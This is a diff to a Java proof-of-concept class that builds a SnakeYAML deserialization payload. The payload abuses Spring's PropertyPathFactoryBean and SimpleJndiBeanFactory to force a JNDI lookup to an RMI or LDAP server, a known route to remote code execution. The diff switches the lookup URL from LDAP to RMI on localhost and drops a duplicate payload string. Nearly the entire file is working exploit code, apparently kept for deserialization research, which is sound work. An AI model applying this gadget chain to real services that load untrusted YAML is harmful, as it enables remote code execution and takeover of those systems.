@@ -6,17 +6,10 @@ import org.yaml.snakeyaml.Yaml;
 public class SpringPropertyPathFactoryBeanEXP {
     public static void main(String[] args) {
         String payload = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
-                " targetBeanName: \"ldap://localhost:1389/aprvde\"\n" +
+                " targetBeanName: \"rmi://127.0.0.1:1099/7dwqhm\"\n" +
                 " propertyPath: Drunkbaby\n" +
                 " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
-                "  shareableResources: [\"ldap://localhost:1389/aprvde\"]";
-
-        String poc = "!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n" +
-                " targetBeanName: \"rmi://127.0.0.1:1099/nprcsj\"\n" +
-                " propertyPath: Drunkbaby\n" +
-                " beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n" +
-                "  shareableResources: [\"rmi://127.0.0.1:1099/nprcsj\"]";
-
+                "  shareableResources: [\"rmi://127.0.0.1:1099/7dwqhm\"]";
         Yaml yaml = new Yaml();
         yaml.load(payload);
     }
